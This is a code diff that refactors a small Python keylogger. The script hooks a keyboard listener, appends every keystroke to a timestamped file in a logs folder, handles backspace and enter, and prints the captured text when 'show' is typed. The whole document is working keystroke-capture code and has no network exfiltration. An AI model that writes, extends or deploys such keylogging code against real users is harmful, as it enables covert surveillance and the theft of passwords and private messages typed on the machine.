@@ -12,42 +12,25 @@ file_name = f"logs/{current_time}.txt"
 current_time = current_datetime.strftime("%d/%m/%Y %H:%M")
 print(current_time)
 with open(file_name, "w") as file:
-    file.write("")
-#
-# def mainLoop():
-#     while True:
-#         show = input("enter command: ")
-#         if show == "show":
-#             with open(file_name, "r") as file:
-#                 print(file.read())
-def on_press(key):
-    # this function is tracking and printing all the keys the user is typing
-    tempKey = ''
+    file.write("\n***** " + current_time + " *****\n")
+
+
+def spacial_keys(tempKey):
+    if tempKey == "backspace":
+        data = ''
+        with open(file_name, "r") as f:
+            data = f.read()
+        with open(file_name, "w") as f:
+            f.write(data[:-1])
+        return True
+    elif tempKey == "enter":
+        data = ''
+        with open(file_name, "a") as f:
+            f.write('\n')
+        return True
+    return False
+def add_to_file(tempKey):
     global current_time
-    try:
-        tempKey = key.char
-
-    except AttributeError:
-        tempKey = str(key)
-        if tempKey in dict1:
-            tempKey = dict1[tempKey]
-        else:
-            tempKey = " '"+tempKey+"' "
-
-        if tempKey == "backspace":
-            data = ''
-            with open(file_name, "r") as f:
-                data = f.read()
-            with open(file_name, "w") as f:
-                f.write(data[:-1])
-            return
-        elif tempKey == "enter":
-            data = ''
-            with open(file_name, "a") as f:
-                f.write('\n')
-            return
-
-    current_datetime = datetime.now()
     tempTime = datetime.now().strftime("%d/%m/%Y %H:%M")
     if tempTime != current_time:
         with open(file_name, "a") as file:
@@ -59,7 +42,23 @@ def on_press(key):
     with open(file_name, "r") as f:
         data = f.read()
     if data[-4:] == "show":
-        print(data)
+        print("\n"+data[:-4:])
+
+
+def on_press(key):
+    tempKey = ''
+    try:
+        tempKey = key.char
+
+    except AttributeError:
+        tempKey = str(key)
+        if tempKey in dict1:
+            tempKey = dict1[tempKey]
+        else:
+            tempKey = " '" + tempKey + "' "
+        if spacial_keys(tempKey):
+            return
+    add_to_file(tempKey)
 
 
 listener = keyboard.Listener(on_press = on_press)
